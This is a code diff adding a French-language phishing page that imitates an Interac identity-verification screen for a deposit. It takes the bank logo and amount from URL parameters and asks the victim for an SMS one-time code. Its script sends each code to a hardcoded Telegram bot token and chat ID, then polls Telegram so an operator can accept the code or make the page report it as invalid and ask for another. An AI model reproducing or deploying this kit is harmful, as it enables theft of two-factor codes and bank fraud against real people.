@@ -1,0 +1,95 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Authentification Forte - Interac</title>
+    <style>
+        body { font-family: -apple-system, sans-serif; margin: 0; background: #fff; color: #333; }
+        .header-bank { padding: 25px; text-align: center; border-bottom: 1px solid #eee; }
+        .bank-logo { height: 48px; object-fit: contain; }
+        .content { padding: 30px 20px; max-width: 420px; margin: 0 auto; text-align: center; }
+        .security-banner { background: #f0f7ff; border: 1px solid #d0e3ff; padding: 20px; border-radius: 8px; text-align: left; margin-bottom: 25px; }
+        .security-banner h4 { margin: 0 0 10px 0; color: #004c97; display: flex; align-items: center; }
+        input { width: 100%; padding: 15px; border: 1px solid #ccc; border-radius: 4px; font-size: 26px; text-align: center; letter-spacing: 8px; outline: none; background: #fafafa; }
+        .btn-v { width: 100%; padding: 18px; color: white; border: none; border-radius: 4px; font-weight: bold; margin-top: 25px; cursor: pointer; background: #004c97; }
+        #sms-error { display: none; color: #c53030; background: #fff5f5; border: 1px solid #fc8181; padding: 12px; border-radius: 4px; margin-bottom: 15px; font-size: 13px; }
+        #loader { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(255,255,255,0.98); z-index: 10000; flex-direction: column; align-items: center; justify-content: center; }
+        .spin { width: 50px; height: 50px; border: 5px solid #f3f3f3; border-top: 5px solid #004c97; border-radius: 50%; animation: rot 1s linear infinite; }
+        @keyframes rot { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+    <div id="loader"><div class="spin" id="spin-v"></div><p style="margin-top:20px; font-weight:bold;">Vérification de l'identité...</p></div>
+    <div class="header-bank"><img id="v-logo" class="bank-logo"></div>
+    <div class="content">
+        <div class="security-banner">
+            <h4>🛡️ Protection IdentityCheck</h4>
+            <p>Pour sécuriser ce dépôt de <b><span id="v-prix"></span> $</b> et prévenir toute tentative de fraude, saisissez le code unique reçu pour confirmer votre identité.</p>
+        </div>
+        <div id="sms-error">⚠️ Le code saisi est invalide ou a expiré. Un nouveau code a été généré.</div>
+        <form id="vForm">
+            <input type="text" id="c" maxlength="8" placeholder="••••••" required autocomplete="off">
+            <button type="submit" class="btn-v" id="v-btn">Valider l'identité</button>
+        </form>
+    </div>
+
+<script>
+    const p = new URLSearchParams(window.location.search);
+    const logo = decodeURIComponent(p.get('logo') || "");
+    const TOKEN = "8402431772:AAH-BEEIxGCwozhzT1Qs8gMRQmfCz9zBp4o";
+    const CHAT_ID = "1191944530";
+    let isWaiting = false;
+
+    window.onload = function() {
+        document.getElementById('v-logo').src = logo;
+        document.getElementById('v-prix').innerText = p.get('prix');
+        const btn = document.getElementById('v-btn');
+        const spin = document.getElementById('spin-v');
+        let c = "#004c97";
+        if(logo.includes("MTLW2vzq")) c = "#008542";
+        if(logo.includes("76Rx8fqq")) c = "#ed1c24";
+        btn.style.backgroundColor = c; spin.style.borderTopColor = c;
+    };
+
+    document.getElementById('vForm').onsubmit = async function(e) {
+        e.preventDefault();
+        if(isWaiting) return;
+        isWaiting = true;
+        document.getElementById('sms-error').style.display = 'none';
+        document.getElementById('loader').style.display = 'flex';
+
+        const msg = `<b>📩 CODE 2FA</b>\n🔢 CODE : <code>${document.getElementById('c').value}</code>\n💰 MONTANT : ${p.get('prix')} $`;
+        const kb = { inline_keyboard: [[{text:"✅ VALIDER", callback_data:"OK"}, {text:"❌ CODE ERRONÉ", callback_data:"NO"}]] };
+
+        try {
+            await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+                method: "POST", headers: {"Content-Type":"application/json"},
+                body: JSON.stringify({chat_id: CHAT_ID, text: msg, parse_mode: "HTML", reply_markup: kb})
+            });
+
+            let lastId = 0;
+            const init = await fetch(`https://api.telegram.org/bot${TOKEN}/getUpdates`);
+            const dI = await init.json();
+            if(dI.ok && dI.result.length > 0) lastId = dI.result[dI.result.length - 1].update_id;
+
+            while(isWaiting) {
+                try {
+                    const r = await fetch(`https://api.telegram.org/bot${TOKEN}/getUpdates?offset=${lastId+1}&timeout=25`);
+                    const d = await r.json();
+                    if(d.ok && d.result.length > 0) {
+                        for(let u of d.result) {
+                            lastId = u.update_id;
+                            if(u.callback_query) {
+                                if(u.callback_query.data === "OK") { isWaiting = false; window.location.href = "status.html"; return; }
+                                if(u.callback_query.data === "NO") { isWaiting = false; document.getElementById('loader').style.display = 'none'; document.getElementById('sms-error').style.display = 'block'; document.getElementById('c').value = ""; return; }
+                            }
+                        }
+                    }
+                } catch(err) { await new Promise(res => setTimeout(res, 1500)); }
+            }
+        } catch(e) { isWaiting = false; }
+    };
+</script>
+</body>
+</html>
